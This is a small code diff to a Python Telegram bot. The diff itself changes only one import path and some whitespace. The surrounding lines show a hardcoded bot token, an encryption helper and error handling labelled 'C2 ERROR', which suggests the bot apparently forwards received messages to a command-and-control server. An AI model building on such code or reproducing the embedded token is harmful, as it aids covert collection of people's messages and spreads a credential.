@@ -1,7 +1,7 @@
 import requests
 from telegram import Update
 from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes
-from modules.crypto_utils import encrypt_data
+from crypto_utils import encrypt_data
 import base64
 
 TOKEN = "8782474352:AAEK1FCeLrNMqnGXPLgLJfJQ1qmiHV9i9d4"
@@ -38,7 +38,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 timeout=5
             )
 
-        except Exception as e:
+        except Exception as e:   
             print("C2 ERROR:", e)
 
         # 💾 حفظ محلي
